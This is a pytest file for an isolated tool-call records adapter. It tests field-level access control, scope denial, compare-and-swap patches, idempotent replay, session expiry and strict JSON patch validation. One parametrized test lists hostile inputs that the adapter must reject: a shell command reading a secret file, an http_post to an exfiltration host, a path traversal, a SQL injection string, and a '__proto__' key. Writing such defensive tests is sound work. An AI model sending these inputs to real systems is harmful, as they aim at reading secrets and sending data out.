"""Real SQLite transactions, field/resource ACLs, CAS and bounded idempotency.

These tests do not claim OS isolation; the broker's actual-container tests must
prove that separate boundary before this adapter is offered as isolated execution.
"""

import os
from datetime import UTC, datetime, timedelta
from uuid import UUID, uuid4

import pytest

from cutback.core.tool_policy import IsolatedToolPolicy, RecordSeed
from cutback.isolated_records import IsolatedRecords


def records(*, write=True, max_calls=16, max_result_bytes=16000):
    project, owner, resource = uuid4(), uuid4(), uuid4()
    outsider = RecordSeed(
        id=uuid4(),
        project_id=uuid4(),
        owner_id=uuid4(),
        fields={"status": "open", "private_note": "Owned cross-project control"},
    )

    other_owner = RecordSeed(
        id=uuid4(),
        project_id=project,
        owner_id=uuid4(),
        fields={"status": "open", "private_note": "Owned cross-owner control"},
    )
    own = RecordSeed(
        id=resource,
        project_id=project,
        owner_id=owner,
        fields={
            "status": "open",
            "title": "Owned support case",
            "private_note": "SYNTHETIC_PRIVATE_NOT_FOR_MODEL",
        },
    )
    policy = IsolatedToolPolicy.model_validate(
        {
            "project_id": str(project),
            "principal_id": str(owner),
            "session_id": str(uuid4()),
            "image_id": "sha256:" + "a" * 64,
            "grants": [
                {
                    "resource_id": str(resource),
                    "read_fields": ["status", "title"],
                    "transitions": [{"field": "status", "before": "open", "after": "resolved"}]
                    if write
                    else [],
                },
                {"resource_id": str(outsider.id), "read_fields": ["private_note"]},
                {"resource_id": str(other_owner.id), "read_fields": ["private_note"]},
            ],
            "write_approved": write,
            "max_calls": max_calls,
            "max_result_bytes": max_result_bytes,
            "expires_at": (datetime.now(UTC) + timedelta(minutes=2)).isoformat(),
            "content_use_approved": True,
        }
    )
    return (
        IsolatedRecords(policy, [own, outsider, other_owner], os.urandom(32)),
        policy,
        own,
        outsider,
        other_owner,
    )


def test_actual_sql_read_filters_fields_and_transactional_cas_patch_has_one_effect():
    runtime, _, own, _, _ = records()
    try:
        result = runtime.execute(uuid4(), "records_read", {"resource_id": str(own.id)})
        assert result["status"] == "returned"
        assert result["response"]["fields"] == {"status": "open", "title": "Owned support case"}
        assert own.fields["private_note"] not in str(result)
        operation = uuid4()
        args = {
            "resource_id": str(own.id),
            "expected_version": 0,
            "updates": {"status": "resolved"},
        }
        changed = runtime.execute(operation, "records_patch", args)
        assert changed["status"] == "returned" and changed["state_changed"]
        assert changed["response"]["version"] == 1
        repeated = runtime.execute(operation, "records_patch", args)
        assert repeated["replayed"] and repeated["response"] == changed["response"]
        assert runtime.owner_snapshot()[str(own.id)]["version"] == 1
        conflict = runtime.execute(operation, "records_patch", {**args, "expected_version": 1})
        assert conflict["status"] == "denied" and "CONTENT_CONFLICT" in conflict["code"]
        stale = runtime.execute(uuid4(), "records_patch", args)
        assert stale["status"] == "denied" and not stale["state_changed"]
        assert (
            runtime.owner_snapshot()[str(own.id)]["fields"]["private_note"]
            == own.fields["private_note"]
        )
        assert changed["tool_cost_usd"] is changed["complete_task_cost_usd"] is None
    finally:
        runtime.close()


def test_forged_grants_do_not_bypass_project_or_principal_scope():
    runtime, _, own, outsider, other_owner = records()
    try:
        for record in (outsider, other_owner):
            denied = runtime.execute(uuid4(), "records_read", {"resource_id": str(record.id)})
            assert denied["code"] == "ISOLATED_TOOL_RESOURCE_OR_SCOPE_DENIED"
            assert record.fields["private_note"] not in str(denied)
        assert runtime.owner_snapshot()[str(own.id)]["version"] == 0
    finally:
        runtime.close()


@pytest.mark.parametrize(
    "tool,args",
    [
        ("shell", {"command": "cat /synthetic/secret"}),
        ("http_post", {"url": "https://exfil.invalid", "data": "synthetic"}),
        ("records_read", {"resource_id": "../synthetic/secret"}),
        ("records_read", {"resource_id": "' OR 1=1 --"}),
        ("records_read", {"resource_id": str(UUID(int=1)), "owner_id": str(UUID(int=2))}),
        (
            "records_patch",
            {
                "resource_id": str(UUID(int=1)),
                "expected_version": True,
                "updates": {"status": "resolved"},
            },
        ),
    ],
)
def test_untrusted_arguments_are_data_and_never_select_extra_operations(tool, args):
    runtime, _, _, _, _ = records()
    try:
        before = runtime.owner_snapshot()
        result = runtime.execute(uuid4(), tool, args)
        assert result["status"] == "denied" and result["response"] is None
        assert runtime.owner_snapshot() == before
    finally:
        runtime.close()


def test_read_only_and_atomic_multifield_validation_cannot_partially_change_state():
    runtime, _, own, _, _ = records(write=False)
    try:
        denied = runtime.execute(
            uuid4(),
            "records_patch",
            {"resource_id": str(own.id), "expected_version": 0, "updates": {"status": "resolved"}},
        )
        assert (
            denied["status"] == "denied" and runtime.owner_snapshot()[str(own.id)]["version"] == 0
        )
    finally:
        runtime.close()
    runtime, _, own, _, _ = records()
    try:
        denied = runtime.execute(
            uuid4(),
            "records_patch",
            {
                "resource_id": str(own.id),
                "expected_version": 0,
                "updates": {"status": "resolved", "private_note": "unauthorized"},
            },
        )
        assert denied["status"] == "denied"
        assert runtime.owner_snapshot()[str(own.id)]["fields"]["status"] == "open"
    finally:
        runtime.close()


def test_mutable_input_policy_cannot_expand_the_captured_runtime_grant():
    runtime, policy, own, _, _ = records()
    try:
        policy.grants[0].read_fields = ("status", "title", "private_note")
        own.fields["status"] = "mutated outside runtime"
        result = runtime.execute(uuid4(), "records_read", {"resource_id": str(own.id)})
        assert result["response"]["fields"] == {"status": "open", "title": "Owned support case"}
        assert own.fields["private_note"] not in str(runtime.metadata())
    finally:
        runtime.close()


def test_expiry_and_exhaustion_do_not_become_success_or_an_automatic_new_session():
    runtime, _, own, _, _ = records(max_calls=1)
    try:
        runtime.execute(uuid4(), "records_read", {"resource_id": str(own.id)})
        exhausted = runtime.execute(uuid4(), "records_read", {"resource_id": str(own.id)})
        assert exhausted["status"] == "denied" and exhausted["response"] is None
        runtime._deadline = 0
        expired = runtime.execute(uuid4(), "records_read", {"resource_id": str(own.id)})
        assert expired["code"] == "ISOLATED_TOOL_SESSION_EXPIRED_OR_EXHAUSTED"
    finally:
        runtime.close()


def test_policy_needs_strict_content_and_write_approval_and_safe_fields():
    runtime, policy, _, _, _ = records()
    runtime.close()
    value = policy.model_dump(mode="json")
    for update in ({"content_use_approved": 1}, {"write_approved": False}, {"write_approved": 1}):
        with pytest.raises(ValueError):
            IsolatedToolPolicy.model_validate({**value, **update})
    with pytest.raises(ValueError):
        RecordSeed(
            id=uuid4(), project_id=uuid4(), owner_id=uuid4(), fields={"__proto__": "synthetic"}
        )


def test_granted_record_in_other_environment_cannot_be_read_or_changed():
    runtime, policy, own, outsider, other_owner = records()
    runtime.close()
    other_environment = own.model_copy(update={"environment": "production"})
    runtime = IsolatedRecords(policy, [other_environment, outsider, other_owner], os.urandom(32))
    try:
        before = runtime.owner_snapshot()
        for tool, arguments in (
            ("records_read", {"resource_id": str(own.id)}),
            (
                "records_patch",
                {
                    "resource_id": str(own.id),
                    "expected_version": 0,
                    "updates_json": '{"status":"resolved"}',
                },
            ),
        ):
            result = runtime.execute(uuid4(), tool, arguments)
            assert result["status"] == "denied" and result["response"] is None
        assert runtime.owner_snapshot() == before
    finally:
        runtime.close()


@pytest.mark.parametrize(
    "updates",
    [
        '{"status":"resolved","status":"other"}',
        '{"status":NaN}',
        '["resolved"]',
        '{"owner_id":"not-allowed"}',
    ],
)
def test_native_json_patch_rejects_ambiguous_or_unapproved_updates_atomically(updates):
    runtime, _, own, *_ = records()
    try:
        before = runtime.owner_snapshot()
        response = runtime.execute(
            uuid4(),
            "records_patch",
            {
                "resource_id": str(own.id),
                "expected_version": 0,
                "updates_json": updates,
            },
        )
        assert response["status"] == "denied" and not response["state_changed"]
        assert runtime.owner_snapshot() == before
    finally:
        runtime.close()
